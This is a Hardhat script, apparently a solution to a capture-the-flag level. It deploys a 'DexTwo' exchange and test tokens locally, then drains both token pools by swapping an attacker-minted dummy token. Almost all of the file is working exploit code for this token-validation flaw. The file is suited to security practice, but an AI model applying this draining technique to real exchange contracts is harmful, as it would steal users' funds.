// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function print_balances(player, dummy, token1, token2, dex) {
    console.log('1-P', await token1.balanceOf(player.address))
    console.log('2-P', await token2.balanceOf(player.address))
    console.log('1-D', await token1.balanceOf(dex.address))
    console.log('2-D', await token2.balanceOf(dex.address))
    console.log('D-P', await dummy.balanceOf(player.address))
    console.log('D-D', await dummy.balanceOf(dex.address))
}

async function main() {
    const [owner, player] = await ethers.getSigners();

    // admin setup

    const Dex = await hre.ethers.getContractFactory("DexTwo");
    let dex = await Dex.deploy();
    await dex.deployed();

    let SwappableToken = await hre.ethers.getContractFactory("SwappableTokenTwo");
    let SwappableTokenTwoHack = await hre.ethers.getContractFactory("SwappableTokenTwoHack");
    let token1 = await SwappableToken.deploy(dex.address, "TST1", "TST1", 110);
    await token1.deployed();

    let token2 = await SwappableToken.deploy(dex.address, "TST2", "TST2", 110);
    await token2.deployed();

    
    let tx = await token1.transfer(dex.address, 100)
    await tx.wait()
    tx = await token1.transfer(player.address, 10)
    await tx.wait()
    tx = await token2.transfer(dex.address, 100)
    await tx.wait()
    tx = await token2.transfer(player.address, 10)
    await tx.wait()

    // admin setup done
    
    SwappableToken = SwappableToken.connect(player)
    SwappableTokenTwoHack = SwappableTokenTwoHack.connect(player)
    let dummyToken = await SwappableTokenTwoHack.deploy(dex.address, "DM", "DM", 20);
    await dummyToken.deployed();

    
    

    dex = dex.connect(player)
    token1 = token1.connect(player)
    token2 = token2.connect(player)
    dummyToken = dummyToken.connect(player)

    tx = await dummyToken.transfer(dex.address, 10)
    await tx.wait()
    tx = await dummyToken.transfer(player.address, 10)
    await tx.wait()

    await (await dummyToken.approve(dex.address, 10)).wait()

    console.log("before swap")
    await print_balances(player, dummyToken, token1, token2, dex);
    tx = await dex.swap(dummyToken.address, token2.address, 10);
    await tx.wait()
    console.log("after swap")
    await print_balances(player, dummyToken, token1, token2, dex);

    await (await dummyToken.mint(20)).wait()
    await (await dummyToken.approve(dex.address, 20)).wait()


    console.log("before swap 2")
    await print_balances(player, dummyToken, token1, token2, dex);
    tx = await dex.swap(dummyToken.address, token1.address, 20);
    await tx.wait()
    console.log("after swap 2")
    await print_balances(player, dummyToken, token1, token2, dex);

}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
